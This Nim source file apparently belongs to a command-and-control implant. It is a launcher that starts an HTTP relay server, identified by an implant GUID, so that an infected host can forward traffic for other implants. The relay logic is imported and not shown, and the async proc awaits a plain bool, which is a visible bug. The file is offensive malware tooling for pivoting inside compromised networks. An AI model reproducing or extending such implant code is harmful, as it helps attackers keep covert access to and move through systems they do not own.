#[
    HTTP Relay Server Launcher
    Starts the HTTP relay server if RELAY_PORT is defined at compile time
]#

import asyncdispatch, threadpool
import http_relay

# Check if RELAY_PORT is defined at compile time
const RELAY_PORT {.intdefine.}: int = 0

# Global flag to prevent duplicate starts
var g_relayServerStarted: bool = false
var g_relayServerPort: int = 0

# Background proc to run relay server (non-blocking)
proc runRelayServerInBackground(port: int, implantGuid: string) =
    when defined debug:
        echo "[RELAY] 🔧 Background thread starting relay server on port " & $port
    try:
        discard startHttpRelayServer(port, implantGuid)
    except Exception as e:
        when defined debug:
            echo "[RELAY] ❌ Background relay server crashed: " & e.msg

# Start HTTP relay server with dynamic port (runtime command)
# Returns immediately after spawning background server
proc startRelayServerWithPort*(port: int, implantGuid: string): bool =
    # Idempotent guard: return early if already started
    if g_relayServerStarted:
        when defined debug:
            echo "[RELAY] ℹ️  Relay server already started on port " & $g_relayServerPort & ", skipping duplicate start"
        return false
    
    when defined debug:
        echo "[RELAY] 🚀 Starting HTTP Relay server on port " & $port
        echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
    
    # Start relay server in background thread (non-blocking)
    try:
        # Spawn background thread
        when compileOption("threads"):
            spawn runRelayServerInBackground(port, implantGuid)
        else:
            # Fallback: start in current thread (will block, but at least works)
            runRelayServerInBackground(port, implantGuid)
        
        g_relayServerStarted = true  # Mark as started
        g_relayServerPort = port
        
        when defined debug:
            echo "[RELAY] ✅ HTTP Relay server spawned on port " & $port
        
        return true
                
    except Exception as e:
        when defined debug:
            echo "[RELAY] ❌ Exception starting relay server: " & e.msg
            echo "[RELAY] ❌ Stack trace: " & e.getStackTrace()
        return false

# Start HTTP relay server in async mode (compile-time RELAY_PORT)
proc startRelayServerAsync*(implantGuid: string) {.async.} =
    when RELAY_PORT > 0:
        # Use compile-time RELAY_PORT
        await startRelayServerWithPort(RELAY_PORT, implantGuid)
    else:
        when defined debug:
            echo "[RELAY] ℹ️  No relay server configured (RELAY_PORT not defined)"

# Check if this implant should act as relay server
proc isRelayServer*(): bool =
    when RELAY_PORT > 0:
        return true
    else:
        return false

# Get the relay server port (0 if not configured)
proc getRelayServerPort*(): int =
    when RELAY_PORT > 0:
        return RELAY_PORT
    else:
        return 0
